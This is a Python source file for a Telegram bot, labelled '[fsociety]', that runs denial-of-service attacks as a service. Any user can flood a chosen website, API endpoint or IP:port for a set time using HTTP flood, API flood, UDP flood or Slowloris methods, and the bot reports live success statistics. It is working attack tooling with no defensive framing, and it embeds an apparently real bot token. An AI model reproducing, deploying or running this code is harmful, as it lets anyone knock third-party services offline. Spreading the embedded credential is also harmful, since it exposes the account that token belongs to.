#!/usr/bin/env python3
"""
[fsociety] TELEGRAM DDOS BOT - DEPLOY ON RAILWAY
Token embedded - No .env needed - Live attack stats
"""

import asyncio
import aiohttp
import random
import socket
import threading
import time
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# ========== CONFIG - PUT YOUR TOKEN HERE ==========
BOT_TOKEN = "8957381735:AAEbDCbmmzvT1aDUBdUOjDAHZdbi5OQpxxQ"  # <--- PASTE YOUR TOKEN HERE
# ==================================================

# Attack tracking
active_attacks = {}
attack_stats = {}  # {user_id: {'total': 0, 'success': 0, 'fail': 0}}

# User Agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
]

# ========== HTTP FLOOD ATTACK ==========
async def http_flood(url: str, duration: int, user_id: int):
    """HTTP flood with success/fail tracking"""
    end_time = time.time() + duration
    stats = {'total': 0, 'success': 0, 'fail': 0}
    attack_stats[user_id] = stats
    
    async with aiohttp.ClientSession() as session:
        while time.time() < end_time and active_attacks.get(user_id, True):
            try:
                random_path = f"/{random.randint(1,9999)}?{random.randint(1,9999)}={random.randint(1,9999)}"
                headers = {"User-Agent": random.choice(USER_AGENTS)}
                async with session.get(url + random_path, headers=headers, timeout=5) as resp:
                    stats['total'] += 1
                    if resp.status < 500:
                        stats['success'] += 1
                        print(f"[+] {stats['total']} | {resp.status} | OK")
                    else:
                        stats['fail'] += 1
                        print(f"[!] {stats['total']} | {resp.status} | FAIL")
            except asyncio.TimeoutError:
                stats['total'] += 1
                stats['fail'] += 1
                print(f"[x] {stats['total']} | TIMEOUT | FAIL")
            except:
                stats['total'] += 1
                stats['fail'] += 1
                print(f"[x] {stats['total']} | ERROR | FAIL")

# ========== API FLOOD ATTACK ==========
async def api_flood(url: str, duration: int, user_id: int):
    """API endpoint flood"""
    end_time = time.time() + duration
    stats = {'total': 0, 'success': 0, 'fail': 0}
    attack_stats[user_id] = stats
    
    async with aiohttp.ClientSession() as session:
        while time.time() < end_time and active_attacks.get(user_id, True):
            try:
                params = {
                    "id": random.randint(1, 999999),
                    "query": "a" * random.randint(10, 100),
                    "token": random.randint(100000, 999999),
                    "t": time.time()
                }
                headers = {"User-Agent": random.choice(USER_AGENTS)}
                async with session.get(url, params=params, headers=headers, timeout=5) as resp:
                    stats['total'] += 1
                    if resp.status < 500:
                        stats['success'] += 1
                        print(f"[API] {stats['total']} | {resp.status} | OK")
                    else:
                        stats['fail'] += 1
                        print(f"[API] {stats['total']} | {resp.status} | FAIL")
            except:
                stats['total'] += 1
                stats['fail'] += 1
                print(f"[API] {stats['total']} | ERROR | FAIL")

# ========== UDP FLOOD ATTACK ==========
def udp_flood(ip: str, port: int, duration: int, user_id: int):
    """UDP flood"""
    end_time = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = random._urandom(1024)
    stats = {'total': 0, 'success': 0, 'fail': 0}
    attack_stats[user_id] = stats
    
    while time.time() < end_time and active_attacks.get(user_id, True):
        try:
            sock.sendto(packet, (ip, port))
            stats['total'] += 1
            stats['success'] += 1
            if stats['total'] % 100 == 0:
                print(f"[UDP] {stats['total']} packets to {ip}:{port}")
        except:
            stats['total'] += 1
            stats['fail'] += 1
    sock.close()

# ========== SLOWLORIS ==========
def slowloris_attack(host: str, port: int, duration: int, user_id: int):
    """Slowloris connection exhaustion"""
    end_time = time.time() + duration
    stats = {'total': 0, 'success': 0, 'fail': 0}
    attack_stats[user_id] = stats
    sockets = []
    
    while time.time() < end_time and active_attacks.get(user_id, True):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((host, port))
            sock.send(f"GET /?{random.randint(1,9999)} HTTP/1.1\r\n".encode())
            sock.send(f"Host: {host}\r\n".encode())
            sock.send(f"User-Agent: {random.choice(USER_AGENTS)}\r\n".encode())
            sockets.append(sock)
            stats['total'] += 1
            stats['success'] += 1
            print(f"[SLOW] Connections: {len(sockets)}")
        except:
            stats['total'] += 1
            stats['fail'] += 1
        time.sleep(0.1)
    
    for sock in sockets:
        sock.close()

# ========== BOT KEYBOARD ==========
def get_main_keyboard():
    keyboard = [
        [InlineKeyboardButton("🔥 HTTP FLOOD", callback_data="http")],
        [InlineKeyboardButton("💣 API FLOOD", callback_data="api")],
        [InlineKeyboardButton("📡 UDP FLOOD", callback_data="udp")],
        [InlineKeyboardButton("🐌 SLOWLORIS", callback_data="slow")],
        [InlineKeyboardButton("🛑 STOP ATTACK", callback_data="stop")],
        [InlineKeyboardButton("📊 LIVE STATS", callback_data="stats")],
    ]
    return InlineKeyboardMarkup(keyboard)

# ========== BOT COMMANDS ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "💀 *DDOS ATTACK BOT v4.0* 💀\n\n"
        "⚡ *Methods:*\n"
        "• HTTP Flood - Website killer\n"
        "• API Flood - Endpoint flooder  \n"
        "• UDP Flood - IP/Port attack\n"
        "• Slowloris - Connection exhaust\n\n"
        "📌 *Commands:*\n"
        "`/attack <url> <seconds>`\n"
        "`/attack api <url> <seconds>`\n"
        "`/attack udp <ip> <port> <seconds>`\n"
        "`/stop` - Stop attack\n"
        "`/stats` - Live stats\n\n"
        "*Example:*\n"
        "`/attack https://example.com 30`\n"
        "`/attack api https://api.test.com 30`\n"
        "`/attack udp 1.1.1.1 80 30`\n\n"
        "✅ *READY FOR BATTLE*",
        parse_mode="Markdown",
        reply_markup=get_main_keyboard()
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    
    if query.data == "stop":
        active_attacks[user_id] = False
        await query.edit_message_text("🛑 Attack stopped! Use /start for new attack")
    
    elif query.data == "stats":
        stats = attack_stats.get(user_id, {'total': 0, 'success': 0, 'fail': 0})
        status = "🔴 RUNNING" if active_attacks.get(user_id, False) else "⚪ IDLE"
        success_rate = (stats['success']/stats['total']*100) if stats['total'] > 0 else 0
        await query.edit_message_text(
            f"📊 *LIVE ATTACK STATS*\n\n"
            f"Status: {status}\n"
            f"Total: `{stats['total']}`\n"
            f"Success: ✅ `{stats['success']}`\n"
            f"Failed: ❌ `{stats['fail']}`\n"
            f"Success Rate: `{success_rate:.1f}%`\n"
            f"User: `{user_id}`",
            parse_mode="Markdown"
        )
    
    else:
        context.user_data['attack_type'] = query.data
        await query.edit_message_text(
            f"✅ *{query.data.upper()} mode selected*\n\n"
            f"Send command:\n"
            f"`/attack <target> <duration>`\n\n"
            f"Examples:\n"
            f"• `/attack https://example.com 60`\n"
            f"• `/attack api https://api.com 30`\n"
            f"• `/attack udp 1.1.1.1 80 30`",
            parse_mode="Markdown"
        )

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    args = context.args
    attack_type = context.user_data.get('attack_type', 'http')
    
    if not args:
        await update.message.reply_text("❌ Usage: `/attack <target> <duration>`", parse_mode="Markdown")
        return
    
    if attack_type == "udp":
        if len(args) < 3:
            await update.message.reply_text("❌ UDP: `/attack udp <IP> <PORT> <seconds>`")
            return
        target = args[0]
        port = int(args[1])
        duration = int(args[2])
        display_target = f"{target}:{port}"
    else:
        if len(args) < 2:
            await update.message.reply_text("❌ HTTP: `/attack <URL> <seconds>`")
            return
        target = args[0]
        duration = int(args[1])
        port = None
    
    await update.message.reply_text(
        f"🎯 *ATTACK DEPLOYED*\n"
        f"Method: `{attack_type.upper()}`\n"
        f"Target: `{target}`\n"
        f"Duration: `{duration}s`\n\n"
        f"📊 Use /stats to see live results\n"
        f"🛑 Use /stop to cancel",
        parse_mode="Markdown"
    )
    
    active_attacks[user_id] = True
    
    try:
        if attack_type == "http":
            await http_flood(target, duration, user_id)
        elif attack_type == "api":
            await api_flood(target, duration, user_id)
        elif attack_type == "udp":
            await asyncio.to_thread(udp_flood, target, port, duration, user_id)
        elif attack_type == "slow":
            host = target.replace("https://", "").replace("http://", "").split('/')[0].split(':')[0]
            await asyncio.to_thread(slowloris_attack, host, 80, duration, user_id)
        
        stats = attack_stats.get(user_id, {'total': 0, 'success': 0, 'fail': 0})
        success_rate = (stats['success']/stats['total']*100) if stats['total'] > 0 else 0
        
        if active_attacks.get(user_id, True):
            await update.message.reply_text(
                f"✅ *ATTACK COMPLETE*\n"
                f"Total: `{stats['total']}`\n"
                f"Success: ✅ `{stats['success']}`\n"
                f"Failed: ❌ `{stats['fail']}`\n"
                f"Rate: `{success_rate:.1f}%`",
                parse_mode="Markdown"
            )
    
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")
    
    finally:
        active_attacks.pop(user_id, None)
        attack_stats.pop(user_id, None)

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    stats = attack_stats.get(user_id, {'total': 0, 'success': 0, 'fail': 0})
    is_active = active_attacks.get(user_id, False)
    success_rate = (stats['success']/stats['total']*100) if stats['total'] > 0 else 0
    
    status = "🔴 ATTACKING" if is_active else "⚪ IDLE"
    bar = "█" * int(success_rate/10) + "░" * (10 - int(success_rate/10))
    
    await update.message.reply_text(
        f"📊 *ATTACK STATISTICS*\n\n"
        f"Status: {status}\n"
        f"Total Requests: `{stats['total']}`\n"
        f"Successful: ✅ `{stats['success']}`\n"
        f"Failed: ❌ `{stats['fail']}`\n"
        f"Success Rate: `{success_rate:.1f}%`\n"
        f"Progress: `{bar}`\n\n"
        f"User ID: `{user_id}`",
        parse_mode="Markdown"
    )

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    active_attacks[user_id] = False
    await update.message.reply_text("🛑 Attack stopped!")

# ========== MAIN ==========
def main():
    if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("❌ ERROR: Put your bot token in BOT_TOKEN variable!")
        print("Open bot.py and replace YOUR_BOT_TOKEN_HERE with your actual token")
        return
    
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack_command))
    app.add_handler(CommandHandler("stop", stop_command))
    app.add_handler(CommandHandler("stats", stats_command))
    app.add_handler(CallbackQueryHandler(button_handler))
    
    print("🤖 BOT STARTED! Send /start on Telegram")
    print(f"📊 Bot token: {BOT_TOKEN[:10]}...")
    app.run_polling()

if __name__ == "__main__":
    main()